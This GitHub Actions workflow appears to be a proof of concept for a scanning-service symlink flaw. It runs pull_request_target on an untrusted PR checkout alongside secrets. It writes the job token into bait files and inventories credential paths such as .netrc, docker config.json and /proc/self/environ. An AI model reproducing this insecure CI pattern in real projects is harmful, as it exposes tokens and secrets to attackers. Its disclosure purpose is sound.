name: S1 CI Symlink Impact Proof

on:
  pull_request_target:
    types: [opened, synchronize, reopened]

permissions:
  contents: read
  pull-requests: read

jobs:
  checks-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout PR head
        uses: actions/checkout@v4
        with:
          repository: ${{ github.event.pull_request.head.repo.full_name }}
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Create runner-owned outside source
        shell: bash
        env:
          GH_JOB_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          mkdir -p /tmp/checks-runner-owned
          fork_boundary_marker="S1_FORK_LOG_BOUNDARY_20260526_${GITHUB_RUN_ID}_${GITHUB_RUN_ATTEMPT}"
          cat > /tmp/checks-runner-owned/RunnerOwnedSecret.java <<EOF
          class RunnerOwnedSecret {
            void leak(android.content.ContentResolver cr) {
              String androidId = Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID);
              String forkBoundaryMarker = "$fork_boundary_marker";
            }
          }
          EOF
          chmod 600 /tmp/checks-runner-owned/RunnerOwnedSecret.java
          printf 'runner-owned-file=%s\n' /tmp/checks-runner-owned/RunnerOwnedSecret.java
          cat > /tmp/checks-runner-owned/RunnerGithubToken.java <<EOF
          class RunnerGithubToken {
            void leak(android.content.ContentResolver cr) {
              String androidId = Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID);
              String token = "$GH_JOB_TOKEN";
            }
          }
          EOF
          chmod 600 /tmp/checks-runner-owned/RunnerGithubToken.java
          printf 'runner-token-source=%s\n' /tmp/checks-runner-owned/RunnerGithubToken.java

      - name: Resolve public sources outside checkout
        shell: bash
        run: |
          set -euo pipefail
          sdkmanager_path="${ANDROID_HOME:-/usr/local/lib/android/sdk}/cmdline-tools/latest/bin/sdkmanager"
          if [[ -x "$sdkmanager_path" ]]; then
            yes | "$sdkmanager_path" --licenses >/dev/null || true
            "$sdkmanager_path" "sources;android-35"
          else
            printf 'sdkmanager-missing path=%s\n' "$sdkmanager_path"
          fi

          mkdir -p /tmp/checks-natural-sources/androidx-core
          if command -v mvn >/dev/null 2>&1; then
            mvn -B -q org.apache.maven.plugins:maven-dependency-plugin:3.6.1:copy \
              -Dartifact=androidx.core:core:1.13.1:jar:sources \
              -DoutputDirectory=/tmp/checks-natural-sources
            mv /tmp/checks-natural-sources/core-1.13.1-sources.jar \
              /tmp/checks-natural-sources/androidx-core-sources.jar
          else
            curl -L --fail --compressed \
              https://repo1.maven.org/maven2/androidx/core/core/1.13.1/core-1.13.1-sources.jar \
              -o /tmp/checks-natural-sources/androidx-core-sources.jar
          fi
          unzip -q /tmp/checks-natural-sources/androidx-core-sources.jar \
            -d /tmp/checks-natural-sources/androidx-core
          for path in \
            /usr/local/lib/android/sdk/sources/android-35/android/provider/Settings.java \
            /usr/local/lib/android/sdk/sources/android-35/android/telephony/TelephonyManager.java \
            /tmp/checks-natural-sources/androidx-core/androidx/core/telephony/TelephonyManagerCompat.java \
            /tmp/checks-natural-sources/androidx-core/androidx/core/telephony/SubscriptionManagerCompat.java \
            /tmp/checks-natural-sources/androidx-core/androidx/core/hardware/fingerprint/FingerprintManagerCompat.java
          do
            if [[ -e "$path" ]]; then
              printf 'natural-source-exists path=%s bytes=%s\n' "$path" "$(wc -c < "$path")"
            else
              printf 'natural-source-missing path=%s\n' "$path"
            fi
          done

      - name: Record runner file inventory without dumping contents
        shell: bash
        run: |
          set -euo pipefail
          candidates=(
            "/home/runner/work/_temp/_github_home/.netrc"
            "/home/runner/work/_temp/_github_home/.gitconfig"
            "/home/runner/work/_temp/_github_workflow/event.json"
            "/home/runner/.docker/config.json"
            "/home/runner/.gitconfig"
            "$PWD/.git/config"
            "/etc/passwd"
            "/etc/resolv.conf"
            "/proc/self/environ"
            "/tmp/checks-runner-owned/RunnerOwnedSecret.java"
            "/tmp/checks-runner-owned/RunnerGithubToken.java"
            "/usr/local/lib/android/sdk/sources/android-34/android/provider/Settings.java"
            "/usr/local/lib/android/sdk/sources/android-35/android/provider/Settings.java"
            "/usr/local/lib/android/sdk/sources/android-36/android/provider/Settings.java"
            "/usr/local/lib/android/sdk/sources/android-34/android/telephony/TelephonyManager.java"
            "/usr/local/lib/android/sdk/sources/android-35/android/telephony/TelephonyManager.java"
            "/usr/local/lib/android/sdk/sources/android-36/android/telephony/TelephonyManager.java"
            "/tmp/checks-natural-sources/androidx-core/androidx/core/telephony/TelephonyManagerCompat.java"
            "/tmp/checks-natural-sources/androidx-core/androidx/core/telephony/SubscriptionManagerCompat.java"
            "/tmp/checks-natural-sources/androidx-core/androidx/core/hardware/fingerprint/FingerprintManagerCompat.java"
          )
          for path in "${candidates[@]}"; do
            if [[ -e "$path" ]]; then
              bytes=$(wc -c < "$path" || true)
              printf 'candidate-exists path=%s bytes=%s\n' "$path" "$bytes"
            else
              printf 'candidate-missing path=%s\n' "$path"
            fi
          done

      - name: Install Checks CLI
        shell: bash
        run: |
          set -euo pipefail
          curl --compressed https://dl.google.com/checks/cli/latest/checks-linux -o checks
          chmod +x ./checks
          ./checks --version

      - name: Materialize Checks service-account credentials
        shell: bash
        run: |
          set -euo pipefail
          printf '%s' '${{ secrets.CHECKS_SERVICE_ACCOUNT_JSON }}' > "$RUNNER_TEMP/checks-sa.json"
          chmod 600 "$RUNNER_TEMP/checks-sa.json"

      - name: Run Checks scan on PR-controlled checkout
        shell: bash
        env:
          CHECKS_CREDENTIALS: ${{ runner.temp }}/checks-sa.json
        run: |
          set -euo pipefail
          ./checks code scan . \
            --account-id=2023322768 \
            --repo-id=1867966104 \
            --scm-remote-url=https://github.com/claudeloba/checks-s1-ci-impact-poc \
            --branch-name=ci-xss \
            --scm-revision=S1_CI_CONSOLE_XSS_PROBE_20260526 \
            --format=json \
            --wait-and-print-report \
            --timeout=20m \
            --disable-analytics \
            --disable-version-check \
            --no-input | tee "$RUNNER_TEMP/checks-s1-output.json"
